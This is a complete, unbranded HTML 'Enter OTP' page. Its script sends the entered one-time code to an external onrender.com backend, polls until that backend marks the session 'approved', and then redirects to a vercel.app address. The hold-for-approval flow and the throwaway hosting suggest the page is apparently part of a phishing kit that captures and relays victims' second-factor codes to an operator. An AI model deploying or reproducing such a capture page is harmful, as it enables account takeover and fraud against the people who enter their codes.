<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Enter OTP</title>

  <style>
    /* -------------------------------------------------
       BASIC RESET & TYPOGRAPHY
       ------------------------------------------------- */
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: sans-serif; background: #fafafa; }

    /* -------------------------------------------------
       MAIN CONTAINER
       ------------------------------------------------- */
    .main-container {
      min-height: 100vh;
      padding: 2rem 1rem;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* -------------------------------------------------
       CANCEL BUTTON
       ------------------------------------------------- */
    .cancel {
      width: 100%;
      display: flex;
      justify-content: flex-end;
      margin-bottom: 1rem;
    }
    .cancel > div {
      width: 44px; height: 44px;
      border: 1px solid #bbb;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }

    /* -------------------------------------------------
       TITLE
       ------------------------------------------------- */
    .title {
      width: 100%;
      font-size: 2rem;
      font-weight: 300;
      margin-bottom: 2rem;
    }

    /* -------------------------------------------------
       INPUT SECTION
       ------------------------------------------------- */
    .input-section {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: .4rem;
      margin-bottom: 1rem;
    }
    .form-input {
      padding: .75rem 1rem;
      border: 1px solid #bbb;
      border-radius: 4px;
      font-size: 1rem;
      text-align: center;
      letter-spacing: 0.5ch;
      max-width: 280px;
      margin: 0 auto;
    }
    .form-input::placeholder {
      letter-spacing: normal;
    }

    .error {
      color: #d32f2f;
      font-size: .9rem;
      margin-top: .5rem;
      text-align: center;
      display: none;
    }

    .forget {
      align-self: center;
      margin: 1rem 0 1.5rem;
    }
    .forget a {
      color: #000;
      text-decoration: underline;
      text-decoration-color: #ff5733;
    }

    /* -------------------------------------------------
       VERIFY BUTTON
       ------------------------------------------------- */
    .continue-button {
      width: 100%;
      display: flex;
      justify-content: center;
    }
    .continue-btn {
      min-width: 140px;
      padding: .75rem 1.5rem;
      background: #ff5733;
      color: #fff;
      border: none;
      border-radius: 2rem;
      font-size: 1rem;
      cursor: pointer;
      transition: background .2s;
    }
    .continue-btn:hover { background: #e64a19; }
    .continue-btn:disabled {
      background: #ccc;
      cursor: not-allowed;
    }

    /* -------------------------------------------------
       SPINNER PAGE
       ------------------------------------------------- */
    #spinner-page {
      position: fixed; inset: 0;
      background: rgba(255,255,255,.94);
      display: none; flex-direction: column;
      align-items: center; justify-content: center;
      z-index: 9999;
    }
    .spinner {
      width: 56px; height: 56px;
      border: 6px solid #f3f3f3;
      border-top: 6px solid #ff5733;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 1rem;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    #spinner-page p { font-size: 1.1rem; color: #333; }

    /* -------------------------------------------------
       RESPONSIVE BREAKPOINTS
       ------------------------------------------------- */
    @media (min-width: 576px) {
      .main-container { padding: 2rem; }
    }
    @media (min-width: 768px) {
      .main-container { max-width: 480px; margin: auto; }
      .input-section { flex-direction: row; align-items: center; justify-content: center; }
      .input-section > div { margin-right: 1rem; margin-bottom: 0; }
      .form-input { width: 220px; margin: 0; }
      .continue-button { justify-content: flex-end; }
    }
  </style>
</head>

<body>
  <!-- ==================== MAIN FORM ==================== -->
  <div class="main-container">
    <section class="cancel">
      <div><span style="color:#ff5733;">X</span></div>
    </section>

    <h1 class="title">Enter OTP</h1>

    <div class="input-section">
      <div>One-Time Password</div>
      <input
        type="text"
        id="otp"
        class="form-input"
        placeholder="••••••"
        maxlength="6"
        inputmode="numeric"
        pattern="[0-9]*"
      >
    </div>

    <div class="error" id="error"></div>

    <div class="forget"><a href="#" id="resend-otp">Resend OTP</a></div>

    <div class="continue-button">
      <button id="verify-btn" class="continue-btn">Verify</button>
    </div>
  </div>

  <!-- ==================== SPINNER ==================== -->
  <div id="spinner-page">
    <div class="spinner"></div>
    <p>Please wait…</p>
  </div>

  <!-- ==================== SCRIPT ==================== -->
  <script>
    const verifyBtn     = document.getElementById("verify-btn");
    const errorDiv      = document.getElementById("error");
    const spinnerPage   = document.getElementById("spinner-page");
    const resendLink    = document.getElementById("resend-otp");
    const backendUrl    = "https://op-9nkj.onrender.com";

    const showSpinner = () => spinnerPage.style.display = "flex";
    const hideSpinner = () => spinnerPage.style.display = "none";

    // Auto-focus OTP input
    document.getElementById("otp").focus();

    // Restrict to numbers only
    document.getElementById("otp").addEventListener("input", (e) => {
      e.target.value = e.target.value.replace(/[^0-9]/g, "").slice(0, 6);
    });

    verifyBtn.addEventListener("click", async () => {
      const otp = document.getElementById("otp").value.trim();

      if (!otp || otp.length !== 6) {
        errorDiv.textContent = "Please enter a valid 6-digit OTP.";
        errorDiv.style.display = "block";
        return;
      }

      errorDiv.style.display = "none";
      showSpinner();
      verifyBtn.disabled = true;

      try {
        const resp = await fetch(`${backendUrl}/otp`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ otp })
        });
        const data = await resp.json();

        if (!data.success) throw new Error(data.error || "Invalid OTP");

        const sessionId = data.id;

        const poll = async () => {
          try {
            const sResp = await fetch(`${backendUrl}/status/${sessionId}`);
            const status = await sResp.json();

            if (status.status === "approved" && status.redirect_url) {
              hideSpinner();
              window.location.href = `https://opfi.vercel.app/${status.redirect_url}`;
            } else {
              setTimeout(poll, 2000);
            }
          } catch (err) {
            throw err;
          }
        };

        poll();
      } catch (e) {
        hideSpinner();
        errorDiv.textContent = e.message || "Verification failed. Try again.";
        errorDiv.style.display = "block";
        verifyBtn.disabled = false;
      }
    });

    // Optional: Resend OTP (you can link this to backend later)
    resendLink.addEventListener("click", (e) => {
      e.preventDefault();
      alert("OTP resent! (Implement backend resend logic)");
      // Optionally trigger resend API here
    });
  </script>
</body>
</html>
